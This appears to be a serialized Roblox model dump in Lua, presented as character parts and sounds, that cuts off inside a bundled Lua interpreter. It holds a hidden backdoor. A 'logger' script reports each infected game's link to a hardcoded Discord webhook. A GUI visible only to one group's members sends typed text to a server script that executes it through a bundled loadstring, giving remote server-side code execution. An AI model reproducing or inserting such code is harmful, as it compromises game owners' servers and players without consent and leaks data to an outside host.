 
local ScreenGui = Instance.new("ScreenGui") 
local CharacterSoundEvent14 = Instance.new("RemoteEvent") 
local RightGripAttachment = Instance.new("Attachment") 
local RightShoulderAttachment = Instance.new("Attachment") 
local CharacterSoundEvent15 = Instance.new("RemoteEvent") 
local LeftGripAttachment = Instance.new("Attachment") 
local LeftShoulderAttachment = Instance.new("Attachment") 
local CharacterSoundEvent16 = Instance.new("RemoteEvent") 
local Neck = Instance.new("Motor6D") 
local LeftHip = Instance.new("Motor6D") 
local RightHip = Instance.new("Motor6D") 
local LeftShoulder = Instance.new("Motor6D") 
local RightShoulder = Instance.new("Motor6D") 
local WaistBackAttachment = Instance.new("Attachment") 
local WaistCenterAttachment = Instance.new("Attachment") 
local WaistFrontAttachment = Instance.new("Attachment") 
local RightCollarAttachment = Instance.new("Attachment") 
local LeftCollarAttachment = Instance.new("Attachment") 
local BodyBackAttachment = Instance.new("Attachment") 
local BodyFrontAttachment = Instance.new("Attachment") 
local NeckAttachment = Instance.new("Attachment") 
local roblox = Instance.new("Decal") 
local CharacterSoundEvent17 = Instance.new("RemoteEvent") 
local face = Instance.new("Decal") 
local Climbing18 = Instance.new("Sound") 
local Swimming19 = Instance.new("Sound") 
local Running20 = Instance.new("Sound") 
local Splash21 = Instance.new("Sound") 
local Landing22 = Instance.new("Sound") 
local Jumping23 = Instance.new("Sound") 
local FreeFalling24 = Instance.new("Sound") 
local Died25 = Instance.new("Sound") 
local GettingUp26 = Instance.new("Sound") 
local FaceCenterAttachment = Instance.new("Attachment") 
local FaceFrontAttachment = Instance.new("Attachment") 
local HatAttachment = Instance.new("Attachment") 
local HairAttachment = Instance.new("Attachment") 
local Mesh = Instance.new("SpecialMesh") 
local CharacterSoundEvent27 = Instance.new("RemoteEvent") 
local GettingUp28 = Instance.new("Sound") 
local Died29 = Instance.new("Sound") 
local FreeFalling30 = Instance.new("Sound") 
local Jumping31 = Instance.new("Sound") 
local Landing32 = Instance.new("Sound") 
local Splash33 = Instance.new("Sound") 
local Running34 = Instance.new("Sound") 
local Swimming35 = Instance.new("Sound") 
local Climbing36 = Instance.new("Sound") 
local GettingUp = Instance.new("Sound") 
local Died = Instance.new("Sound") 
local FreeFalling = Instance.new("Sound") 
local Jumping = Instance.new("Sound") 
local Landing = Instance.new("Sound") 
local Splash = Instance.new("Sound") 
local Running = Instance.new("Sound") 
local Swimming = Instance.new("Sound") 
local Climbing = Instance.new("Sound") 
local CharacterSoundEvent37 = Instance.new("RemoteEvent") 
local CharacterSoundEvent38 = Instance.new("RemoteEvent") 
local CharacterSoundEvent39 = Instance.new("RemoteEvent") 
local CharacterSoundEvent40 = Instance.new("RemoteEvent") 
local CharacterSoundEvent41 = Instance.new("RemoteEvent") 
local CharacterSoundEvent42 = Instance.new("RemoteEvent") 
local CharacterSoundEvent43 = Instance.new("RemoteEvent") 
local CharacterSoundEvent44 = Instance.new("RemoteEvent") 
local CharacterSoundEvent45 = Instance.new("RemoteEvent") 
local CharacterSoundEvent46 = Instance.new("RemoteEvent") 
local CharacterSoundEvent47 = Instance.new("RemoteEvent") 
local CharacterSoundEvent48 = Instance.new("RemoteEvent") 
local CharacterSoundEvent49 = Instance.new("RemoteEvent") 
local CharacterSoundEvent50 = Instance.new("RemoteEvent") 
local CharacterSoundEvent51 = Instance.new("RemoteEvent") 
local CharacterSoundEvent52 = Instance.new("RemoteEvent") 
local CharacterSoundEvent53 = Instance.new("RemoteEvent") 
local CharacterSoundEvent54 = Instance.new("RemoteEvent") 
local CharacterSoundEvent55 = Instance.new("RemoteEvent") 
local CharacterSoundEvent56 = Instance.new("RemoteEvent") 
local CharacterSoundEvent57 = Instance.new("RemoteEvent") 
local CharacterSoundEvent58 = Instance.new("RemoteEvent") 
local CharacterSoundEvent59 = Instance.new("RemoteEvent") 
local CharacterSoundEvent60 = Instance.new("RemoteEvent") 
local CharacterSoundEvent61 = Instance.new("RemoteEvent") 
local CharacterSoundEvent62 = Instance.new("RemoteEvent") 
local CharacterSoundEvent = Instance.new("RemoteEvent") 
local Script = Instance.new("Script") 
local RemoteEvent = Instance.new("RemoteEvent") 
local LocalScript = Instance.new("LocalScript") 
ScreenGui.Archivable = true 
ScreenGui.AutoLocalize = true 
ScreenGui.DisplayOrder = 0 
ScreenGui.Enabled = true 
ScreenGui.IgnoreGuiInset = false 
ScreenGui.Name = "ScreenGui" 
ScreenGui.Parent = MainModule 
ScreenGui.ResetOnSpawn = true 
ScreenGui.RootLocalizationTable = nil 
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling 
Frame.Active = false 
Frame.AnchorPoint = 0, 0 
Frame.Archivable = true 
Frame.AutoLocalize = true 
Frame.BackgroundColor3 = Color3.new(1, 1, 1) 
Frame.BackgroundTransparency = 0 
Frame.BorderColor3 = Color3.new(0, 0, 0) 
Frame.BorderSizePixel = 1 
Frame.ClipsDescendants = false 
Frame.LayoutOrder = 0 
Frame.Name = "Frame" 
Frame.NextSelectionDown = nil 
Frame.NextSelectionLeft = nil 
Frame.NextSelectionRight = nil 
Frame.NextSelectionUp = nil 
Frame.Parent = ScreenGui 
Frame.Position = {0.0163934417, 0}, {0.0810753778, 0} 
Frame.RootLocalizationTable = nil 
Frame.Rotation = 0 
Frame.Selectable = false 
Frame.SelectionImageObject = nil 
Frame.Size = {0, 500}, {0, 30} 
Frame.SizeConstraint = Enum.SizeConstraint.RelativeXY 
Frame.Style = Enum.FrameStyle.Custom 
Frame.Visible = false 
Frame.ZIndex = 1 
LocalScript1.Archivable = true 
LocalScript1.Disabled = false 
LocalScript1.Source = [[local plr = game.Players.LocalPlayer

if (plr:IsInGroup(33292557)) then
	script.Parent.Frame.Visible = true
else
	script.Parent:Destroy()
end
]] 
LocalScript1.Name = "LocalScript1" 
LocalScript1.Parent = ScreenGui 
ImageLabel2.Active = false 
ImageLabel2.AnchorPoint = 0, 0 
ImageLabel2.Archivable = true 
ImageLabel2.AutoLocalize = true 
ImageLabel2.BackgroundColor3 = Color3.new(1, 1, 1) 
ImageLabel2.BackgroundTransparency = 1 
ImageLabel2.BorderColor3 = Color3.new(0, 0, 0) 
ImageLabel2.BorderSizePixel = 0 
ImageLabel2.ClipsDescendants = false 
ImageLabel2.Image = "rbxassetid://743461068" 
ImageLabel2.ImageColor3 = Color3.new(1, 1, 1) 
ImageLabel2.ImageRectOffset = 0, 0 
ImageLabel2.ImageRectSize = 0, 0 
ImageLabel2.ImageTransparency = 0 
ImageLabel2.LayoutOrder = 0 
ImageLabel2.Name = "ImageLabel2" 
ImageLabel2.NextSelectionDown = nil 
ImageLabel2.NextSelectionLeft = nil 
ImageLabel2.NextSelectionRight = nil 
ImageLabel2.NextSelectionUp = nil 
ImageLabel2.Parent = Frame 
ImageLabel2.Position = {0.0120000001, 0}, {0.0620686859, 0} 
ImageLabel2.RootLocalizationTable = nil 
ImageLabel2.Rotation = 0 
ImageLabel2.ScaleType = Enum.ScaleType.Stretch 
ImageLabel2.Selectable = false 
ImageLabel2.SelectionImageObject = nil 
ImageLabel2.Size = {0, 25}, {0, 25} 
ImageLabel2.SizeConstraint = Enum.SizeConstraint.RelativeXY 
ImageLabel2.SliceCenter = 0, 0, 0, 0 
ImageLabel2.SliceScale = 1 
ImageLabel2.TileSize = {1, 0}, {1, 0} 
ImageLabel2.Visible = true 
ImageLabel2.ZIndex = 1 
main.Active = false 
main.AnchorPoint = 0, 0 
main.Archivable = true 
main.AutoLocalize = true 
main.BackgroundColor3 = Color3.new(1, 1, 1) 
main.BackgroundTransparency = 0 
main.BorderColor3 = Color3.new(0, 0, 0) 
main.BorderSizePixel = 1 
main.ClipsDescendants = false 
main.LayoutOrder = 0 
main.Name = "main" 
main.NextSelectionDown = nil 
main.NextSelectionLeft = nil 
main.NextSelectionRight = nil 
main.NextSelectionUp = nil 
main.Parent = Frame 
main.Position = {-0.000870666525, 0}, {0.975208819, 0} 
main.RootLocalizationTable = nil 
main.Rotation = 0 
main.Selectable = false 
main.SelectionImageObject = nil 
main.Size = {0, 500}, {0, 290} 
main.SizeConstraint = Enum.SizeConstraint.RelativeXY 
main.Style = Enum.FrameStyle.Custom 
main.Visible = true 
main.ZIndex = 1 
Drag.Archivable = true 
Drag.Disabled = false 
Drag.Source = [[local UIS = game:GetService('UserInputService')
local frame = script.Parent
local dragToggle = nil
local dragSpeed = 0.25
local dragStart = nil
local startPos = nil

local function updateInput(input)
	local delta = input.Position - dragStart
	local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
		startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	game:GetService('TweenService'):Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
end

frame.InputBegan:Connect(function(input)
	if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
		dragToggle = true
		dragStart = input.Position
		startPos = frame.Position
		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragToggle = false
			end
		end)
	end
end)

UIS.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
		if dragToggle then
			updateInput(input)
		end
	end
end)
]] 
Drag.Name = "Drag" 
Drag.Parent = Frame 
TextButton.Active = true 
TextButton.AnchorPoint = 0, 0 
TextButton.Archivable = true 
TextButton.AutoButtonColor = true 
TextButton.AutoLocalize = true 
TextButton.BackgroundColor3 = Color3.new(1, 1, 1) 
TextButton.BackgroundTransparency = 0 
TextButton.BorderColor3 = Color3.new(0, 0, 0) 
TextButton.BorderSizePixel = 1 
TextButton.ClipsDescendants = false 
TextButton.Font = Enum.Font.SourceSans 
TextButton.LayoutOrder = 0 
TextButton.LineHeight = 1 
TextButton.Modal = false 
TextButton.Name = "TextButton" 
TextButton.NextSelectionDown = nil 
TextButton.NextSelectionLeft = nil 
TextButton.NextSelectionRight = nil 
TextButton.NextSelectionUp = nil 
TextButton.Parent = Frame 
TextButton.Position = {0.853999853, 0}, {0.147126138, 0} 
TextButton.RootLocalizationTable = nil 
TextButton.Rotation = 0 
TextButton.Selectable = true 
TextButton.Selected = false 
TextButton.SelectionImageObject = nil 
TextButton.Size = {0, 60}, {0, 20} 
TextButton.SizeConstraint = Enum.SizeConstraint.RelativeXY 
TextButton.Style = Enum.ButtonStyle.Custom 
TextButton.Text = Close 
TextButton.TextColor3 = Color3.new(0, 0, 0) 
TextButton.TextScaled = false 
TextButton.TextSize = 17 
TextButton.TextStrokeColor3 = Color3.new(0, 0, 0) 
TextButton.TextStrokeTransparency = 1 
TextButton.TextTransparency = 0 
TextButton.TextTruncate = Enum.TextTruncate.None 
TextButton.TextWrapped = false 
TextButton.TextXAlignment = Enum.TextXAlignment.Center 
TextButton.TextYAlignment = Enum.TextYAlignment.Center 
TextButton.Visible = true 
TextButton.ZIndex = 1 
ImageLabel.Active = false 
ImageLabel.AnchorPoint = 0, 0 
ImageLabel.Archivable = true 
ImageLabel.AutoLocalize = true 
ImageLabel.BackgroundColor3 = Color3.new(1, 1, 1) 
ImageLabel.BackgroundTransparency = 1 
ImageLabel.BorderColor3 = Color3.new(0, 0, 0) 
ImageLabel.BorderSizePixel = 0 
ImageLabel.ClipsDescendants = false 
ImageLabel.Image = "rbxassetid://78020109523165" 
ImageLabel.ImageColor3 = Color3.new(1, 1, 1) 
ImageLabel.ImageRectOffset = 0, 0 
ImageLabel.ImageRectSize = 0, 0 
ImageLabel.ImageTransparency = 0 
ImageLabel.LayoutOrder = 0 
ImageLabel.Name = "ImageLabel" 
ImageLabel.NextSelectionDown = nil 
ImageLabel.NextSelectionLeft = nil 
ImageLabel.NextSelectionRight = nil 
ImageLabel.NextSelectionUp = nil 
ImageLabel.Parent = main 
ImageLabel.Position = {6.10351591e-08, 0}, {0.0655172393, 0} 
ImageLabel.RootLocalizationTable = nil 
ImageLabel.Rotation = 0 
ImageLabel.ScaleType = Enum.ScaleType.Stretch 
ImageLabel.Selectable = false 
ImageLabel.SelectionImageObject = nil 
ImageLabel.Size = {0, 500}, {0, 271} 
ImageLabel.SizeConstraint = Enum.SizeConstraint.RelativeXY 
ImageLabel.SliceCenter = 0, 0, 0, 0 
ImageLabel.SliceScale = 1 
ImageLabel.TileSize = {1, 0}, {1, 0} 
ImageLabel.Visible = true 
ImageLabel.ZIndex = 1 
Frame3.Active = false 
Frame3.AnchorPoint = 0, 0 
Frame3.Archivable = true 
Frame3.AutoLocalize = true 
Frame3.BackgroundColor3 = Color3.new(1, 1, 1) 
Frame3.BackgroundTransparency = 1 
Frame3.BorderColor3 = Color3.new(0, 0, 0) 
Frame3.BorderSizePixel = 0 
Frame3.ClipsDescendants = false 
Frame3.LayoutOrder = 0 
Frame3.Name = "Frame3" 
Frame3.NextSelectionDown = nil 
Frame3.NextSelectionLeft = nil 
Frame3.NextSelectionRight = nil 
Frame3.NextSelectionUp = nil 
Frame3.Parent = main 
Frame3.Position = {-6.10351591e-08, 0}, {0, 0} 
Frame3.RootLocalizationTable = nil 
Frame3.Rotation = 0 
Frame3.Selectable = false 
Frame3.SelectionImageObject = nil 
Frame3.Size = {0, 500}, {0, 220} 
Frame3.SizeConstraint = Enum.SizeConstraint.RelativeXY 
Frame3.Style = Enum.FrameStyle.Custom 
Frame3.Visible = true 
Frame3.ZIndex = 1 
Cle.Active = true 
Cle.AnchorPoint = 0, 0 
Cle.Archivable = true 
Cle.AutoButtonColor = true 
Cle.AutoLocalize = true 
Cle.BackgroundColor3 = Color3.new(1, 1, 1) 
Cle.BackgroundTransparency = 0 
Cle.BorderColor3 = Color3.new(0, 0, 0) 
Cle.BorderSizePixel = 1 
Cle.ClipsDescendants = false 
Cle.Font = Enum.Font.SourceSans 
Cle.LayoutOrder = 0 
Cle.LineHeight = 1 
Cle.Modal = false 
Cle.Name = "Cle" 
Cle.NextSelectionDown = nil 
Cle.NextSelectionLeft = nil 
Cle.NextSelectionRight = nil 
Cle.NextSelectionUp = nil 
Cle.Parent = main 
Cle.Position = {0.280000001, 0}, {0.79070878, 0} 
Cle.RootLocalizationTable = nil 
Cle.Rotation = 0 
Cle.Selectable = true 
Cle.Selected = false 
Cle.SelectionImageObject = nil 
Cle.Size = {0, 111}, {0, 50} 
Cle.SizeConstraint = Enum.SizeConstraint.RelativeXY 
Cle.Style = Enum.ButtonStyle.Custom 
Cle.Text = Clear 
Cle.TextColor3 = Color3.new(0, 0, 0) 
Cle.TextScaled = false 
Cle.TextSize = 17 
Cle.TextStrokeColor3 = Color3.new(0, 0, 0) 
Cle.TextStrokeTransparency = 1 
Cle.TextTransparency = 0 
Cle.TextTruncate = Enum.TextTruncate.None 
Cle.TextWrapped = false 
Cle.TextXAlignment = Enum.TextXAlignment.Center 
Cle.TextYAlignment = Enum.TextYAlignment.Center 
Cle.Visible = true 
Cle.ZIndex = 1 
Exe.Active = true 
Exe.AnchorPoint = 0, 0 
Exe.Archivable = true 
Exe.AutoButtonColor = true 
Exe.AutoLocalize = true 
Exe.BackgroundColor3 = Color3.new(1, 1, 1) 
Exe.BackgroundTransparency = 0 
Exe.BorderColor3 = Color3.new(0, 0, 0) 
Exe.BorderSizePixel = 1 
Exe.ClipsDescendants = false 
Exe.Font = Enum.Font.SourceSans 
Exe.LayoutOrder = 0 
Exe.LineHeight = 1 
Exe.Modal = false 
Exe.Name = "Exe" 
Exe.NextSelectionDown = nil 
Exe.NextSelectionLeft = nil 
Exe.NextSelectionRight = nil 
Exe.NextSelectionUp = nil 
Exe.Parent = main 
Exe.Position = {0.0248706583, 0}, {0.79070878, 0} 
Exe.RootLocalizationTable = nil 
Exe.Rotation = 0 
Exe.Selectable = true 
Exe.Selected = false 
Exe.SelectionImageObject = nil 
Exe.Size = {0, 111}, {0, 50} 
Exe.SizeConstraint = Enum.SizeConstraint.RelativeXY 
Exe.Style = Enum.ButtonStyle.Custom 
Exe.Text = Exe 
Exe.TextColor3 = Color3.new(0, 0, 0) 
Exe.TextScaled = false 
Exe.TextSize = 17 
Exe.TextStrokeColor3 = Color3.new(0, 0, 0) 
Exe.TextStrokeTransparency = 1 
Exe.TextTransparency = 0 
Exe.TextTruncate = Enum.TextTruncate.None 
Exe.TextWrapped = false 
Exe.TextXAlignment = Enum.TextXAlignment.Center 
Exe.TextYAlignment = Enum.TextYAlignment.Center 
Exe.Visible = true 
Exe.ZIndex = 1 
R.Active = true 
R.AnchorPoint = 0, 0 
R.Archivable = true 
R.AutoButtonColor = true 
R.AutoLocalize = true 
R.BackgroundColor3 = Color3.new(1, 1, 1) 
R.BackgroundTransparency = 0 
R.BorderColor3 = Color3.new(0, 0, 0) 
R.BorderSizePixel = 1 
R.ClipsDescendants = false 
R.Font = Enum.Font.SourceSans 
R.LayoutOrder = 0 
R.LineHeight = 1 
R.Modal = false 
R.Name = "R" 
R.NextSelectionDown = nil 
R.NextSelectionLeft = nil 
R.NextSelectionRight = nil 
R.NextSelectionUp = nil 
R.Parent = main 
R.Position = {0.758000016, 0}, {0.79070878, 0} 
R.RootLocalizationTable = nil 
R.Rotation = 0 
R.Selectable = true 
R.Selected = false 
R.SelectionImageObject = nil 
R.Size = {0, 109}, {0, 50} 
R.SizeConstraint = Enum.SizeConstraint.RelativeXY 
R.Style = Enum.ButtonStyle.Custom 
R.Text = R6 
R.TextColor3 = Color3.new(0, 0, 0) 
R.TextScaled = false 
R.TextSize = 17 
R.TextStrokeColor3 = Color3.new(0, 0, 0) 
R.TextStrokeTransparency = 1 
R.TextTransparency = 0 
R.TextTruncate = Enum.TextTruncate.None 
R.TextWrapped = false 
R.TextXAlignment = Enum.TextXAlignment.Center 
R.TextYAlignment = Enum.TextYAlignment.Center 
R.Visible = true 
R.ZIndex = 1 
logger.Archivable = true 
logger.Disabled = false 
logger.Source = [[local http = game:GetService("HttpService")
local hook = "https://discord.com/api/webhooks/1399106953661120652/w96OvGMF6JCc7g-TVuQhe59HAq8buHV1IJ-OMjISNB4UuY9NVDBkg_lwMWuaBxXQ8I0-"
local Data =
	{
		["content"] = "Infected Game Found! Link: https://www.roblox.com/games/"..game.PlaceId,
	}

Data = http:JSONEncode(Data)
http:PostAsync(hook, Data)]] 
logger.Name = "logger" 
logger.Parent = main 
TextBox.Active = true 
TextBox.AnchorPoint = 0, 0 
TextBox.Archivable = true 
TextBox.AutoLocalize = true 
TextBox.BackgroundColor3 = Color3.new(1, 1, 1) 
TextBox.BackgroundTransparency = 1 
TextBox.BorderColor3 = Color3.new(0, 0, 0) 
TextBox.BorderSizePixel = 0 
TextBox.ClearTextOnFocus = true 
TextBox.ClipsDescendants = false 
TextBox.Font = Enum.Font.SourceSans 
TextBox.LayoutOrder = 0 
TextBox.LineHeight = 1 
TextBox.MultiLine = false 
TextBox.Name = "TextBox" 
TextBox.NextSelectionDown = nil 
TextBox.NextSelectionLeft = nil 
TextBox.NextSelectionRight = nil 
TextBox.NextSelectionUp = nil 
TextBox.Parent = Frame3 
TextBox.PlaceholderColor3 = Color3.new(0, 0, 0) 
TextBox.PlaceholderText = -- Scripts in here 
TextBox.Position = {0.0248707272, 0}, {0.0363636352, 0} 
TextBox.RootLocalizationTable = nil 
TextBox.Rotation = 0 
TextBox.Selectable = true 
TextBox.SelectionImageObject = nil 
TextBox.ShowNativeInput = true 
TextBox.Size = {0, 474}, {0, 212} 
TextBox.SizeConstraint = Enum.SizeConstraint.RelativeXY 
TextBox.Text = " " 
TextBox.TextColor3 = Color3.new(0, 0, 0) 
TextBox.TextScaled = false 
TextBox.TextSize = 17 
TextBox.TextStrokeColor3 = Color3.new(0, 0, 0) 
TextBox.TextStrokeTransparency = 1 
TextBox.TextTransparency = 0 
TextBox.TextTruncate = Enum.TextTruncate.None 
TextBox.TextWrapped = false 
TextBox.TextXAlignment = Enum.TextXAlignment.Left 
TextBox.TextYAlignment = Enum.TextYAlignment.Top 
TextBox.Visible = true 
TextBox.ZIndex = 1 
LocalScript4.Archivable = true 
LocalScript4.Disabled = false 
LocalScript4.Source = [[local box = script.Parent.Parent.Frame1.TextBox

script.Parent.MouseButton1Click:Connect(function()
	box.Text = "-- Script Cleared!"
	wait(.6)
	box.Text = ""
end)]] 
LocalScript4.Name = "LocalScript4" 
LocalScript4.Parent = Cle 
RemoteEvent5.Archivable = true 
RemoteEvent5.Name = "RemoteEvent5" 
RemoteEvent5.Parent = Exe 
LocalScript6.Archivable = true 
LocalScript6.Disabled = false 
LocalScript6.Source = [[-- Fires RemoteEvent once button is pressed

local RS = script.Parent.RemoteEvent

script.Parent.MouseButton1Click:Connect(function()
	RS:FireServer(script.Parent.Parent.Frame1.TextBox.Text) -- Fires the Text in the TextBox
end)]] 
LocalScript6.Name = "LocalScript6" 
LocalScript6.Parent = Exe 
Script7.Archivable = true 
Script7.Disabled = false 
Script7.Source = [[-- Pick up FireEvent once button is pressed

local sss = script.Parent.RemoteEvent

sss.OnServerEvent:Connect(function(skid, lol)
	require(script.Loadstring)(lol)()
end)]] 
Script7.Name = "Script7" 
Script7.Parent = Exe 
Loadstring.Archivable = true 
Loadstring.Source = [[--[[
		vLua 5.1 - Lua written in Lua Virtual Machine
		---------------
		vLua is a virtual machine and compiler for dynamically compiling and executing Lua.
		It'll work on both client and server, regardless of LoadStringEnabled. This module is
		designed to be a drop in replacement for loadstring, meaning you can do the following:
		
		Example:
			local loadstring = require(workspace.Loadstring)
			local executable, compileFailReason = loadstring("print('hello from vLua!')")
			executable()
		
		Please note, vLua IS SLOWER COMPARED TO vanilla Lua, although Luau does improve performance.
		Do not attemptp to run performance intensive tasks without testing first, otherwise you
		may have a bad time.
		
		Interested in improving yourself as a programmer? Consider joining Bleu Pigs - Scripters, a community
		focused on self improving and showing off creations. Visit the link below to learn more
		https://devforum.roblox.com/u/bleupigs
		
		Changelog:
			[3222021]
				- fixed module erroring due to missing script variable
				- removed types until TypedLua is more stable/adopted
				- added an how to use example
		
			[372021]
				- updated  FiOne to latest release
				- migrated Yeuliang to improved version from Moonshine
		
		Credits:
			- FiOne LBI (created by same author as Rerubi) - https://github.com/Rerumu/FiOne
			- Yueliang 5 (Lua compiler in Lua) - http://yueliang.luaforge.net/
			- Moonshine (improved version of Yeuliang) - https://github.com/gamesys/moonshine
]]
local compile = require(script:WaitForChild("Yueliang"))
local createExecutable = require(script:WaitForChild("FiOne"))
getfenv().script = nil

return function(source, env)
	local executable
	local env = env or getfenv(2)
	local name = (env.script and env.script:GetFullName())
	local ran, failureReason = pcall(function()
		local compiledBytecode = compile(source, name)
		executable = createExecutable(compiledBytecode)
	end)
	
	if ran then
		return executable
	end
	return nil, failureReason
end]] 
Loadstring.Name = "Loadstring" 
Loadstring.Parent = Script7 
FiOne.Archivable = true 
FiOne.Source = [[local bit = bit or bit32 or require('bit')
local unpack = table.unpack or unpack

local stm_lua_bytecode
local wrap_lua_func
local stm_lua_func

-- SETLIST config
local FIELDS_PER_FLUSH = 50

-- opcode types for getting values
local opcode_t = {
	[0] = 'ABC',
	'ABx',
	'ABC',
	'ABC',
	'ABC',
	'ABx',
	'ABC',
	'ABx',
	'ABC',
	'ABC',
	'ABC',
	'ABC',
	'ABC',
	'ABC',
	'ABC',
	'ABC',
	'ABC',
	'ABC',
	'ABC',
	'ABC',
	'ABC',
	'ABC',
	'AsBx',
	'ABC',
	'ABC',
	'ABC',
	'ABC',
	'ABC',
	'ABC',
	'ABC',
	'ABC',
	'AsBx',
	'AsBx',
	'ABC',
	'ABC',
	'ABC',
	'ABx',
	'ABC',
}

local opcode_m = {
	[0] = {b = 'OpArgR', c = 'OpArgN'},
	{b = 'OpArgK', c = 'OpArgN'},
	{b = 'OpArgU', c = 'OpArgU'},
	{b = 'OpArgR', c = 'OpArgN'},
	{b = 'OpArgU', c = 'OpArgN'},
	{b = 'OpArgK', c = 'OpArgN'},
	{b = 'OpArgR', c = 'OpArgK'},
	{b = 'OpArgK', c = 'OpArgN'},
	{b = 'OpArgU', c = 'OpArgN'},
	{b = 'OpArgK', c = 'OpArgK'},
	{b = 'OpArgU', c = 'OpArgU'},
	{b = 'OpArgR', c = 'OpArgK'},
	{b = 'OpArgK', c = 'OpArgK'},
	{b = 'OpArgK', c = 'OpArgK'},
	{b = 'OpArgK', c = 'OpArgK'},
	{b = 'OpArgK', c = 'OpArgK'},
	{b = 'OpArgK', c = 'OpArgK'},
	{b = 'OpArgK', c = 'OpArgK'},
	{b = 'OpArgR', c = 'OpArgN'},
	{b = 'OpArgR', c = 'OpArgN'},
	{b = 'OpArgR', c = 'OpArgN'},
	{b = 'OpArgR', c = 'OpArgR'},
	{b = 'OpArgR', c = 'OpArgN'},
	{b = 'OpArgK', c = 'OpArgK'},
	{b = 'OpArgK', c = 'OpArgK'},
	{b = 'OpArgK', c = 'OpArgK'},
	{b = 'OpArgR', c = 'OpArgU'},
	{b = 'OpArgR', c = 'OpArgU'},
	{b = 'OpArgU', c = 'OpArgU'},
	{b = 'OpArgU', c = 'OpArgU'},
	{b = 'OpArgU', c = 'OpArgN'},
	{b = 'OpArgR', c = 'OpArgN'},
	{b = 'OpArgR', c = 'OpArgN'},
	{b = 'OpArgN', c = 'OpArgU'},
	{b = 'OpArgU', c = 'OpArgU'},
